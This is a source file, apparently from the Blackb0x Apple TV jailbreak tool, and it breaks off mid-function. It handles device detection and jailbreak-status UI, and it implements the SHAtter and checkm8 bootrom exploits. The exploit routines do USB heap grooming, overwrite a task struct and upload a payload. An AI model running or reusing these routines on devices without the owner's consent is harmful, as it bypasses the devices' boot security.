//
//  DeviceManager.m
//  Blackb0x
//
//  Created by spiral on 15/9/20.
//  Copyright © 2020 spiral. All rights reserved.
//

#import <Cocoa/Cocoa.h>
#import "Blackb0x.h"
#import "DeviceManager.h"
#import "checkm8.h"
#import "SHAtter.h"

#include "libbootkit.h"
#include "config.h"

/*
#import "IOKit/hid/IOHIDManager.h"
#include <IOKit/usb/IOUSBLib.h>
*/

@implementation AppleTVIcon

- (void) printDeviceInfo {
    printf("%s, %s (%s) - %llu\n", [self.deviceModel UTF8String], [self.version UTF8String], [self.buildID UTF8String], self.ecid);
}

+ (instancetype) createWithUDID:(NSString *) udid orECID:(uint64_t) ecid {
    
    int iconSize = 125;
    int spacing = 80;
    NSImage *image = [NSImage imageNamed:@"atv-icon"];
    AppleTVIcon *icon = [[AppleTVIcon alloc] initWithFrame:NSMakeRect(0, 0, iconSize + spacing, iconSize + 100)];
    
    icon.wantsLayer = YES;
    icon.layer.cornerRadius = 24;
    [icon unselect];

    icon.ATVImage = [[NSImageView alloc] initWithFrame:NSMakeRect(spacing /2, 75, iconSize, iconSize)];
    [icon.ATVImage setImage:image];
    
    icon.ecid = ecid;
    icon.udid = udid;
    
    icon.pwnedDFU = -1;
    icon.jailbroken = 0;
    icon.jailbreakRunning = -1;
    icon.needsPostInstall = 1;
    icon.waitForRecovery = 0;

    icon.deviceField = [[NSTextField alloc] initWithFrame:NSMakeRect(spacing / 2, 45, iconSize, 20)];
    [icon.deviceField setAlignment:NSTextAlignmentCenter];
    [icon.deviceField setTextColor:[NSColor whiteColor]];
    icon.deviceField.bezeled = NO;
    icon.deviceField.editable = NO;
    icon.deviceField.drawsBackground = NO;
    
    
    icon.versionField = [[NSTextField alloc] initWithFrame:NSMakeRect(spacing / 2, 23, iconSize, 20)];
    [icon.versionField setAlignment:NSTextAlignmentCenter];
    icon.versionField.bezeled = NO;
    icon.versionField.editable = NO;
    icon.versionField.drawsBackground = NO;

    icon.checkingIndicator = [[NSProgressIndicator alloc] initWithFrame:NSMakeRect(spacing / 2, -8, iconSize, 10)];
    icon.checkingIndicator.style = NSProgressIndicatorStyleBar;
    [icon.checkingIndicator setIndeterminate:YES];
    icon.checkingIndicator.hidden = YES;
    [icon.checkingIndicator startAnimation:nil];
    
    [icon addSubview:icon.checkingIndicator];
    [icon addSubview:icon.ATVImage];
    [icon addSubview:icon.deviceField];
    [icon addSubview:icon.versionField];
    return icon;
}

- (void) setVersion:(NSString *)version {
    _version = version;
    if(![version isEqual:@"latest"]) self.versionField.stringValue = version;
}

- (void) setDeviceModel:(NSString *)deviceModel {
    
    _deviceModel = deviceModel;
    
    if([deviceModel isEqual:@"AppleTV2,1"]) {
        self.deviceField.stringValue = @"Apple TV 2 (A1378)";
    }
    else if([deviceModel isEqual:@"AppleTV3,1"]) {
        self.deviceField.stringValue = @"Apple TV 3 (A1427)";
    }
    else if([deviceModel isEqual:@"AppleTV3,2"]) {
        self.deviceField.stringValue = @"Apple TV 3 (A1469)";
    }
}

- (void) setBuildID:(nullable NSString *)buildID {
    _buildID = buildID;
}

- (void) select {
    self.layer.backgroundColor = [NSColor colorWithWhite:1.0 alpha:0.08].CGColor;
}

- (void) unselect {
    self.layer.backgroundColor = [NSColor colorWithWhite:1.0 alpha:0.03].CGColor;
}

- (void) mouseUp:(NSEvent *)event {
    MainView *view = [Blackb0x ATVKit].mainView;
    [view setSelected:self];
}

@end


@implementation DeviceManager

irecv_client_t uploadClient = NULL;
irecv_client_t exploitClient = NULL;
irecv_device_t *devices;

- (instancetype) init {
    self = [super init];
    
    Blackb0x *kit = [Blackb0x ATVKit];
    kit.mainView.AppleTVs = [[NSMutableArray alloc] init];

    //irecv_set_debug_level(1);
    irecv_device_event_context_t ctx;
    irecv_device_event_subscribe(&ctx, device_event, NULL);
    
    /*
    irecv_event_subscribe(client, IRECV_CONNECTED, irecovery_event, NULL);
    irecv_event_subscribe(client, IRECV_DISCONNECTED, irecovery_event, NULL);
    irecv_event_subscribe(client, IRECV_RECEIVED, irecovery_event, NULL);
    irecv_event_subscribe(client, IRECV_PRECOMMAND, irecovery_event, NULL);
    irecv_event_subscribe(client, IRECV_POSTCOMMAND, irecovery_event, NULL);
    irecv_event_subscribe(client, IRECV_PROGRESS, irecovery_event, NULL);
     */
    
    idevice_event_subscribe(idevice_event, NULL);
    return self;
}

#pragma mark - Exploits

#pragma mark - SHAtter Exploit

+ (int) SHAtter:(uint64_t) ecid {
    
    irecv_client_t client = get_tv(ecid);
    
    MainView *view = [Blackb0x ATVKit].mainView;
    view.ignoreDisconnect = YES;
    view.ignoreProgress = YES;

    NSTextField *statusBox = view.select_device;
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        
        statusBox.stringValue = @"Preparing buffer overflow";
        view.progress1.doubleValue = 5.0;
    });

    char data_one[0x40];
    memset(data_one, 0, 0x40);
    reset_counters(client);
    get_data(client, data_one, 0x40);
    dispatch_async(dispatch_get_main_queue(), ^(void){
        view.progress1.doubleValue = 15.0;
    });

    usb_reset(client);
    irecv_close(client);
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Requesting validation";
    });

    client = get_tv(ecid);
    
    request_image_validation(client);
    irecv_close(client);
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Filling buffer with zeros";
        view.progress1.doubleValue = 25.0;
    });
    char data_two[0x2C000];
    memset(data_two, 0, 0x2C000);

    client = get_tv(ecid);
    
    get_data(client, data_two, 0x2C000);
    dispatch_async(dispatch_get_main_queue(), ^(void){
        view.progress1.doubleValue = 30.0;
    });
    irecv_close(client);

    msleep(500);

    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Overwriting SHA1 registers";
        view.progress1.doubleValue = 35.0;
    });
    char data_three[0x140];
    memset(data_three, 0, 0x140);

    client = get_tv(ecid);
    reset_counters(client);
    dispatch_async(dispatch_get_main_queue(), ^(void){
        view.progress1.doubleValue = 40.0;
    });
    get_data(client, data_three, 0x140);
    usb_reset(client);
    irecv_close(client);
    
    client = get_tv(ecid);
    dispatch_async(dispatch_get_main_queue(), ^(void){
        view.progress1.doubleValue = 55.0;
    });

    request_image_validation(client);
    irecv_close(client);

    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Sending SHAtter payload";
    });

    char data_four[0x2C000];
    memset(data_four, 0, 0x2C000);

    client = get_tv(ecid);
    dispatch_async(dispatch_get_main_queue(), ^(void){
        view.progress1.doubleValue = 65.0;
    });

    send_buffer(client, SHAtter_payload, 0x800);
    dispatch_async(dispatch_get_main_queue(), ^(void){
        view.progress1.doubleValue = 85.0;
        statusBox.stringValue = @"Overwriting exception vectors";
    });

    get_data(client, data_four, 0x2C000);
    dispatch_async(dispatch_get_main_queue(), ^(void){
        view.progress1.doubleValue = 90.0;
    });
    
    irecv_close(client);

    msleep(500);
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        view.progress1.doubleValue = 100.0;
        statusBox.stringValue = @"SHAtter successful";
    });
    
    view.ignoreDisconnect = NO;
    view.ignoreProgress = NO;
    
    return 1;
}

void reset_counters(irecv_client_t client) {
    int ret = irecv_reset_counters(client);
    
    printf("-- Reset usb counters. (%i)\n", ret);
    if (ret < 0) {
        printf("-- Failed to reset usb counters.\n");
    }
}

void usb_reset(irecv_client_t client) {
    int ret = irecv_reset(client);
    
    printf("-- Reset DFU. (%i)\n", ret);
    if (ret < 0) {
        printf("Failed to reset DFU.\n");
    }
}

void send_buffer(irecv_client_t client, unsigned char *data, unsigned long size) {
    irecv_error_t error = irecv_send_buffer(client, data, size, 0); //dfu_notify_finished?
    printf("send buffer: %i\n", error);
    return;
}

char* get_data(irecv_client_t client, char* buffer, unsigned long length) {
    irecv_error_t error = irecv_recv_buffer(client, buffer, length);
    printf("get_data: %i\n", error);
    return buffer;
}

void request_image_validation(irecv_client_t client) {
    int ret;
    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, NULL, 0, 1000);
    if(ret != 0) {
        printf("Failed to request image validation\n");
    }
    
    unsigned char blank[16];
    bzero(blank, 16);
    
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
    usb_reset(client);
}

int msleep(long msec) {
    struct timespec ts;
    int res;

    if (msec < 0)
    {
        errno = EINVAL;
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do {
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}


#pragma mark - Checkm8 Exploit

+ (int) checkm8:(uint64_t) ecid {

    MainView *view = [Blackb0x ATVKit].mainView;
    view.ignoreDisconnect = YES;
    view.ignoreProgress = YES;

    NSTextField *statusBox = view.select_device;
    
    int ret;
    irecv_client_t client = NULL;
    
    client = get_tv(ecid);
    
    unsigned char buf[0x800] = { 'A' };

    checkm8_config_t config;
    memset(&config, '\0', sizeof(checkm8_config_t));
    
    const struct irecv_device_info* info = irecv_get_device_info(client);
    irecv_device_t device_info = NULL;
    irecv_devices_get_device_by_client(client, &device_info);
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Configuring checkm8 exploit";
        view.progress1.doubleValue = 5.0;
    });
    
    ret = get_exploit_configuration(info->cpid, &config);
    
    if(ret != 0) {
        printf("Failed to get exploit configuration.\n");
        irecv_close(client);
        return 0;
    }

    ret = get_payload_configuration(info->cpid, device_info->product_type, &config);
    
    if(ret != 0) {
        printf("Failed to get payload configuration.\n");
        irecv_close(client);
        return 0;
    }
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Exploiting with checkm8";
        view.progress1.doubleValue = 5.0;
    });
    
    ret = usb_req_stall(client);
    
    if(ret != IRECV_E_PIPE) {
        printf("Failed to stall pipe %i.\n", ret);
        return 0;
    }
    
    usleep(100);
    
    for(int i = 0; i < config.large_leak; i++) {
        ret = usb_req_leak(client);
        if(ret != IRECV_E_TIMEOUT) {
            printf("Failed to create heap hole.\n");
            return 0;
        }
    }
    
    ret = usb_req_no_leak(client);
    
    if(ret != IRECV_E_TIMEOUT) {
        printf("Failed to create heap hole.\n");
        return 0;
    }
    
    irecv_reset(client);
    irecv_close(client);
    
    client = NULL;
    usleep(100);
    
    client = get_tv(ecid);
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Preparing for overwrite";
        view.progress1.doubleValue = 30.0;
    });

    int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
    
    if(sent < 0) {
        printf("Failed to send bug setup.\n");
        irecv_close(client);
        return 0;
    }
    
    if(sent > config.overwrite_offset) {
        printf("Failed to abort bug setup.\n");
        irecv_close(client);
        return 0;
    }
    
    ret = irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0);
    
    if(ret != 0) {
        printf("Failed to send abort.\n");
        return 0;
    }
    
    irecv_close(client);
    client = NULL;
    usleep(500000);
    
    client = get_tv(ecid);
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Grooming heap";
        view.progress1.doubleValue = 50.0;
    });
    
    ret = usb_req_stall(client);
    
    if(ret != IRECV_E_PIPE) {
        printf("Failed to stall pipe.\n");
        return 0;
    }
    
    usleep(100);
    
    ret = usb_req_leak(client);
    
    if(ret != IRECV_E_TIMEOUT) {
        printf("Failed to create heap hole.\n");
        return 0;
    }
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Overwriting task struct";
        view.progress1.doubleValue = 65.0;
    });
    
    unsigned char overwrite_buf[config.overwrite_offset + config.overwrite_len];
    memset(&overwrite_buf, '\0', sizeof(overwrite_buf));
    memcpy(&overwrite_buf[config.overwrite_offset], config.overwrite, config.overwrite_len);
    
    /*
    for(int i = 0; i < sizeof(overwrite_buf); i++) {
        printf("0x%x, ", overwrite_buf[i]);
    }
    */
    
    ret = irecv_usb_control_transfer(client, 0, 0, 0, 0, overwrite_buf, config.overwrite_offset + config.overwrite_len, 100);

    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Uploading payload";
        view.progress1.doubleValue = 75.0;
    });

    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, config.payload, config.payload_len, 100);
    if(ret != IRECV_E_TIMEOUT) {
        printf("Failed to upload payload.\n");
        return 0;
    }
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Executing payload";
        view.progress1.doubleValue = 90.0;
    });
    
    irecv_reset(client);
    irecv_close(client);
    free(config.payload);
    client = NULL;
    usleep(500000);

    client = get_tv(ecid);
    
    info = irecv_get_device_info(client);
    
    char* pwnd_str = strstr(info->serial_string, "PWND:[");
    printf("serial string: %s\n", info->serial_string);
    if(!pwnd_str) {
        irecv_close(client);
        
        dispatch_async(dispatch_get_main_queue(), ^(void){
            statusBox.stringValue = @"Checkm8 unsuccessful";
            view.progress1.doubleValue = 100.0;
        });
        
        return 0;
    }
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        statusBox.stringValue = @"Checkm8 successful";
        view.progress1.doubleValue = 100.0;
    });
    
    view.ignoreDisconnect = NO;
    view.ignoreProgress = NO;
    
    irecv_close(client);
    return 1;
}

int usb_req_stall(irecv_client_t client){
    return irecv_usb_control_transfer(client, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
}

int usb_req_leak(irecv_client_t client){
    unsigned char buf[0x40];
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
}

int usb_req_no_leak(irecv_client_t client){
    unsigned char buf[0x41];
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
}

int get_payload_configuration(uint16_t cpid, const char* identifier, checkm8_config_t* config) {

    switch(cpid) {
        case 0x8947:
            config->payload = malloc(checkm8_payload_length_armv7);
            config->payload_len = checkm8_payload_length_armv7;
            memcpy(config->payload, checkm8_payload_8947, checkm8_payload_length_armv7);
            break;
             
        default:
            printf("No payload offsets are available for your device.\n");
            return -1;
    }
    
    return 0;
}

int get_exploit_configuration(uint16_t cpid, checkm8_config_t* config) {
    switch(cpid) {
        case 0x8947:
            printf("0x8947 configuration\n");
            config->large_leak = 626;
            config->hole = 0;
            config->overwrite_offset = 0x660;
            config->leak = 0;
            config->overwrite = S518947X_OVERWRITE;
            config->overwrite_len = 28;
            return 0;

        default:
            printf("No exploit configuration is available for your device.\n");
            return -1;
    }
}



#pragma mark - AFC Connection (JB Detection)

idevice_t idevice = NULL;
afc_client_t afc_client = NULL;
diagnostics_relay_client_t diag_client = NULL;
lockdownd_client_t lockdown_client = NULL;
lockdownd_error_t lderr = 0;
afc_error_t afcerr = 0;
diagnostics_relay_error_t diagerr = 0;
lockdownd_service_descriptor_t port = NULL;

int isJailbroken(char *str_uuid) {
    int jailbroken = 0;
    
    idevice_error_t ideverr = 0;
    ideverr = idevice_new(&idevice, str_uuid);
    if (ideverr != IDEVICE_E_SUCCESS) {
        return -1;
    }
    
    lderr = lockdownd_client_new_with_handshake(idevice, &lockdown_client, "blackb0x");
    if (lderr != LOCKDOWN_E_SUCCESS) {
        printf("[*] Unable to connect to lockdownd. Please reboot your device and try again.\n");
        return -1;
    }
    
    lderr = lockdownd_start_service(lockdown_client, "com.apple.afc", &port);

    if (lderr != LOCKDOWN_E_SUCCESS) {
        printf("Could not start AFC service\n");
        return -1;
    }
    
    afcerr = afc_client_new(idevice, port, &afc_client);
    if (afcerr != AFC_E_SUCCESS) {
        printf("Could not connect to AFC service\n");
        lockdownd_client_free(lockdown_client);
        idevice_free(idevice);
        return -1;
    }
    
    char **dirs = NULL;

    afc_read_directory(afc_client, "/", &dirs);

    if(!dirs) return -1;
    
    for (int i = 0; dirs[i]; i++) {
        //printf("/%s\n", dirs[i]);
        if(strcmp(dirs[i], ".blackb0x") == 0) jailbroken = 1;
        free(dirs[i]);
    }
    if (dirs)
        free(dirs);

    dirs = NULL;
    
    lockdownd_client_free(lockdown_client);
    lockdown_client = NULL;
    
    return jailbroken;
}

int isJailbreakRunning(char *str_uuid) {
    
    idevice_error_t ideverr = 0;
    ideverr = idevice_new(&idevice, str_uuid);
    if (ideverr != IDEVICE_E_SUCCESS) {
        return -1;
    }
    
    lderr = lockdownd_client_new_with_handshake(idevice, &lockdown_client, "blackb0x");
    if (lderr != LOCKDOWN_E_SUCCESS) {
        printf("[*] Unable to connect to lockdownd. Please reboot your device and try again.\n");
        return -1;
    }
    
    lderr = lockdownd_start_service(lockdown_client, "com.apple.afc2", &port);

    if (lderr != LOCKDOWN_E_SUCCESS) {
        printf("Could not start AFC2 service\n");
        return 0;
    }
    
    printf("Connected to AFC2\n");
    return 1;
}

#pragma mark - Events and Callbacks

int progress_cb(irecv_client_t client, const irecv_event_t *event);

void send_progress(double progress);

void device_event(const irecv_device_event_t *event, void *user_data) {

    uint64_t ecid = event->device_info->ecid;

    if(event->type == IRECV_DEVICE_ADD) {
        
        irecv_client_t client = get_tv(ecid);
        irecv_device_t device = NULL;
        
        irecv_devices_get_device_by_client(client, &device);

        __block uint64_t ecid = event->device_info->ecid;
        int mode;
        char *productType = NULL;
        char *modeStr = NULL;
        
        irecv_get_mode(client, &mode);
        
        modeStr = (char *)mode_to_str(mode);
        productType = (char *)device->product_type;
        
        int pwnedDFU = 0;
        
        char *serial = event->device_info->serial_string;
        
        char *p;
        p = strstr(serial, "SHAtter");
        if(p) pwnedDFU = 1;
        
        p = strstr(serial, "checkm8");
        if (p) pwnedDFU = 2;
        
        printf("✅Device connected (%s, %s)\n", productType, modeStr);
        
        MainView *view = [Blackb0x ATVKit].mainView;
        uint64_t secid = view.selected_ecid;
        
        if(secid == event->device_info->ecid) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [view updateSelectField:@"Click Jailbreak to continue"];
            });
        }
        //print_device_info(device, event->device_info);
        
        dispatch_async(dispatch_get_main_queue(), ^{
            newDevice((char *)device->product_type, (char *)mode_to_str(mode), (char *)"", (char *)"", ecid, (char *)"", pwnedDFU);
        });
        
        irecv_close(client);
    }
    else {
        printf("❎Device disconnected (%llu)\n", event->device_info->ecid);
        
        MainView *view = [Blackb0x ATVKit].mainView;
        
        uint64_t secid = view.selected_ecid;
        
        if(secid == event->device_info->ecid) {
            dispatch_async(dispatch_get_main_queue(), ^{
                view.instructions.stringValue = @"\n\n\n\nNow hold MENU and PLAY/PAUSE until Apple TV LED flashes rapidly";
            });
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            disconnectDevice(ecid, nil);
        });
    }
}


void idevice_event(const idevice_event_t *event, void *user_data) {
    
    if(event->udid == NULL) return;
    
    if(event->conn_type == CONNECTION_NETWORK) {
        return;
    }
    
    __block NSString *udid = [NSString stringWithUTF8String:event->udid];

    switch(event->event) {
        case IDEVICE_DEVICE_ADD :
        {
            NSDictionary *info = [DeviceManager plistForDeviceUUID:(char *)[udid UTF8String]];
            
            printf("✅Device connected (%s, %s)\n", [info[@"ProductType"] UTF8String], "Normal");
            addDeviceWithInfo(info);
        }
            break;
        case IDEVICE_DEVICE_PAIRED :
            //printf("Device paired\n");
            break;
        case IDEVICE_DEVICE_REMOVE :
        {
            printf("Device removed\n");
            
            MainView *view = [Blackb0x ATVKit].mainView;
            
            if([udid isEqual:view.selected_udid]) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    view.instructions.stringValue = @"\n\n\n\nNow hold MENU and PLAY/PAUSE until Apple TV LED flashes rapidly";
                });
            }
            
            dispatch_async(dispatch_get_main_queue(), ^{
                disconnectDevice(-1, udid);
            });
            break;
        }
        default :
            break;
    }
}

void addDeviceWithInfo(NSDictionary *info) {
    dispatch_async(dispatch_get_main_queue(), ^{
        newDevice((char *)[info[@"ProductType"] UTF8String],
                  (char *)"Normal",
                  (char *)[info[@"ProductVersion"] UTF8String],
                  (char *)[info[@"BuildVersion"] UTF8String],
                  (uint64_t)[info[@"UniqueChipID"] longLongValue],
                  (char *)[info[@"UniqueDeviceID"] UTF8String],
                  0);
    });
}

int progress_cb(irecv_client_t client, const irecv_event_t *event) {

    MainView *view = [Blackb0x ATVKit].mainView;
    
    if(view.ignoreProgress == YES) return 0;
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        view.progress1.doubleValue = event->progress;
    });

    return 0;
}

static const char* mode_to_str(int mode) {
    switch (mode) {
        case IRECV_K_RECOVERY_MODE_1:
        case IRECV_K_RECOVERY_MODE_2:
        case IRECV_K_RECOVERY_MODE_3:
        case IRECV_K_RECOVERY_MODE_4:
            return "Recovery";
            break;
        case IRECV_K_DFU_MODE:
            return "DFU";
            break;
        case IRECV_K_WTF_MODE:
            return "WTF";
            break;
        default:
            return "Unknown";
            break;
    }
}

#pragma mark - iRecovery Functions


#pragma mark Shared
- (irecv_client_t) get_tv:(uint64_t) i_ecid {
    return get_tv(i_ecid);
}

/*
 typedef enum {
     IRECV_E_SUCCESS           =  0,
     IRECV_E_NO_DEVICE         = -1,
     IRECV_E_OUT_OF_MEMORY     = -2,
     IRECV_E_UNABLE_TO_CONNECT = -3,
     IRECV_E_INVALID_INPUT     = -4,
     IRECV_E_FILE_NOT_FOUND    = -5,
     IRECV_E_USB_UPLOAD        = -6,
     IRECV_E_USB_STATUS        = -7,
     IRECV_E_USB_INTERFACE     = -8,
     IRECV_E_USB_CONFIGURATION = -9,
     IRECV_E_PIPE              = -10,
     IRECV_E_TIMEOUT           = -11,
     IRECV_E_UNSUPPORTED       = -254,
     IRECV_E_UNKNOWN_ERROR     = -255
 } irecv_error_t;
 */

irecv_client_t get_tv(uint64_t ecid) {
    
    irecv_client_t client = NULL;

    int i = 0;
    for (i = 0; i <= 5; i++) {

        irecv_error_t err = irecv_open_with_ecid(&client, ecid);

        if (err == IRECV_E_UNSUPPORTED) {
            fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
            return NULL;
        }
        else if (err != IRECV_E_SUCCESS)
            sleep(1);
        else
            break;
        
        if (i == 5) {
            int size = snprintf(NULL, 0, "ERROR: %s", irecv_strerror(err));
            char * a = malloc(size + 1);
            sprintf(a, "ERROR: %s", irecv_strerror(err));
            fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
            return NULL;
        }
    }
    
    printf("Connected to Apple TV\n");
    irecv_event_subscribe(client, IRECV_PROGRESS, &progress_cb, NULL);
    return client;
}

- (int) sendCommand:(NSString *) command toDevice:(uint64_t) ecid {
    
    printf("Sending command -> %s", [command UTF8String]);
    
    irecv_client_t client = get_tv(ecid);
    irecv_device_t device = NULL;
    
    irecv_devices_get_device_by_client(client, &device);
    printf("Connected to %s, model %s, cpid 0x%04x, bdid 0x%02x\n", device->product_type, device->hardware_model, device->chip_id, device->board_id);
    
    irecv_error_t err = irecv_send_command(client, [command UTF8String]);
    printf("%s\n", irecv_strerror(err));
    return 1;
}

void print_device_info(irecv_device_t device, struct irecv_device_info *devinfo) {

    if(device)
        printf("[%s - %s] %u / %u (%s)\n", device->product_type, device->hardware_model, device->board_id, device->chip_id, device->display_name);
    if(devinfo) {
        printf("ECID: 0x%016" PRIx64 "\n", devinfo->ecid);
        
        
        printf("CPID: 0x%04x    ", devinfo->cpid);
        printf("CPRV: 0x%02x\n", devinfo->cprv);
        printf("SRTG: %s\n", (devinfo->srtg) ? devinfo->srtg : "N/A");
        printf("NONC: ");
        if (devinfo->ap_nonce) {
            print_hex(devinfo->ap_nonce, devinfo->ap_nonce_size);
        } else {
            printf("N/A");
        }
        printf("    ");
        printf("SNON: ");
        if (devinfo->sep_nonce) {
            print_hex(devinfo->sep_nonce, devinfo->sep_nonce_size);
        } else {
            printf("N/A");
        }
        printf("\n");
         
        char* p = strstr(devinfo->serial_string, "PWND:[");
        if (p) {
            p+=6;
            char* pend = strchr(p, ']');
            if (pend) {
                printf("PWND: %.*s\n", (int)(pend-p), p);
            }
        }
    }
}

- (void) print_normal_info:(NSDictionary *) dict {
    printf("✅Device connected (Normal)\n");
    printf("[%s - %s] %u / %u (%s, %s)\n", [dict[@"ProductType"] UTF8String],
                                       [dict[@"HardwareModel"] UTF8String],
                                       [dict[@"BoardId"] intValue],
                                       [dict[@"ChipID"] intValue],
                                       [dict[@"DeviceName"] UTF8String],
                                       [dict[@"ProductVersion"] UTF8String]);
    printf("ECID: 0x%016" PRIx64 "\n", [dict[@"UniqueChipID"] longLongValue]);
    printf("\n");
    //[iPhone4,1 - n94ap] 8 / 35136 (iPhone 4s)
    //ECID: 0x0000000000000000
    //PWND: checkm8

}


void waitForAFC2(char * udid, int attempts) {

    int jb;
    
    //Lockdownd not ready yet
    if((jb=isJailbreakRunning(udid)) == -1) {
        
        if(attempts > 0) {
            [NSThread sleepForTimeInterval:1];
            waitForAFC2(udid, attempts-1);
            return;
        }
    }
    
    AppleTVIcon *icon = [DeviceManager deviceWithUDID:udid orECID:-1];
    
    dispatch_async(dispatch_get_main_queue(), ^{
        icon.checkingIndicator.hidden = YES;
    });

    printf("Jailbreak active: %s\n", (jb) ? "Yes" : "No");
    [icon setJailbreakRunning:jb];
    free(udid);
}

void checkJailbreakRunning(char *udid) {
    
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        char *u = malloc(39 * sizeof(char));
        strcpy(u, udid);
        waitForAFC2(u, 5);
   });

}

+ (void) checkJailbreak: (NSString *) s_udid {
    if(s_udid == nil) return;
    char *udid = (char *)[s_udid UTF8String];
    checkJailbreak(udid);
}

void checkJailbreak(char *udid) {
    
    if(udid == NULL) return;

    int jailbroken = isJailbroken(udid);
    printf("Jailbroken: %s\n", (jailbroken) ? "Yes" : "No");
    if(jailbroken == -1) {
        dispatch_time_t delay = dispatch_time(DISPATCH_TIME_NOW, 0.3 * NSEC_PER_SEC);
        dispatch_after(delay, dispatch_get_main_queue(), ^(void) {
            checkJailbreak(udid);
        });
        return;
    }
    
    AppleTVIcon *icon = [DeviceManager deviceWithUDID:udid orECID:-1];
    if(icon.jailbroken != 1) icon.jailbroken = jailbroken;
    
    if(icon == [Blackb0x ATVKit].mainView.selected_device) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [[Blackb0x ATVKit].mainView setSelected:icon];
        });
    }
    
    if(jailbroken) {
        checkJailbreakRunning(udid);
    }
    else {
        icon.jailbreakRunning = 0;
        dispatch_async(dispatch_get_main_queue(), ^{
        icon.checkingIndicator.hidden = YES;
        });
    }

}

void newDevice(char *productType, char *modeStr, char *version, char *buildID, uint64_t ecid, char *udid, int pwnedDFU) {

    if(productType == NULL) return;
    if((strstr(productType, "AppleTV3") == NULL) &&
        (strstr(productType, "AppleTV2") == NULL)) return;
    
    __block NSString *s_udid = nil;
    if(udid != NULL) {
        s_udid = [NSString stringWithUTF8String:udid];
    }
    
    MainView *view = [Blackb0x ATVKit].mainView;
    NSMutableArray *AppleTVs = view.AppleTVs;
    AppleTVIcon *icon = [DeviceManager deviceWithUDID:udid orECID:ecid];
    
    if(!icon) {

        icon = [AppleTVIcon createWithUDID:[NSString stringWithUTF8String:udid] orECID:ecid];
        [view addSubview:icon];
        [AppleTVs addObject:icon];
        
    }

    if((strcmp(productType, "AppleTV3,2") == 0) ||
       (strcmp(productType, "AppleTV3,1") == 0)) {
        
        if(strcmp(modeStr, "Recovery") == 0) {
            
            [icon setBuildID:@""];
            [icon setVersion:@""];
            
            if(icon.waitForRecovery == 1) {
                
                NSAlert *alert = [[NSAlert alloc] init];
                [alert setMessageText:@"Done! Connect your AppleTV to a TV."];
                [alert setInformativeText:@"You will be able to use it once it automatically restarts itself."];
                [alert addButtonWithTitle:@"Ok"];
                [alert runModal];
                
                icon.versionField.stringValue = @"Recovery - Jailbroken";
                
            }
            else {
                icon.versionField.stringValue = @"Recovery";
            }
            
        }
    }
    
    if(strcmp(version, "") != 0) {
        [icon setBuildID:[NSString stringWithUTF8String:buildID]];
        [icon setVersion:[NSString stringWithUTF8String:version]];
    }
    
    [icon setDeviceModel:[NSString stringWithUTF8String:productType]];
    [icon setMode:[NSString stringWithUTF8String:modeStr]];
    icon.connected = 1;
    icon.hidden = NO;
    icon.pwnedDFU = pwnedDFU;
    
    arrangeIcons();
    
    if([icon.mode isEqual:@"Normal"]) {
        icon.checkingIndicator.hidden = NO;
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            [DeviceManager checkJailbreak:s_udid];
        });
    }
    
    if(view.selected_ecid == ecid) {
        [view refreshInterface];

        if([icon.mode isEqual:@"DFU"]) {
            if(view.dfuHelper.isVisible) {
                
                if(view.selected_device.jailbroken == 0) [view jailbreakClick];
                else [view tetherbootClick];
                
                [view popupClose];
            }
        }
        else {
            view.instructions.stringValue = @"\n\nTry again \n\n\nHold DOWN and MENU button until Apple TV LED flashes rapidly";
        }
    }
    
    if([icon.udid isEqual:view.selected_udid]) {
        view.instructions.stringValue = @"\n\nTry again \n\n\nHold DOWN and MENU button until Apple TV LED flashes rapidly";
    }
}

#pragma mark GUI Functions

+ (AppleTVIcon *) deviceWithUDID:(char *)udid orECID:(uint64_t)ecid {
    
    MainView *view = [Blackb0x ATVKit].mainView;
    
    for(AppleTVIcon *icon in view.AppleTVs) {
        if(strlen(udid)) {
            if([icon.udid isEqual:[NSString stringWithUTF8String:udid]]) return icon;
        }
        if(ecid != 0) {
            if(icon.ecid == ecid) return icon;
        }
    }
    
    return nil;
}

void disconnectDevice(uint64_t ecid, NSString *udid) {
    
    MainView *view = [Blackb0x ATVKit].mainView;
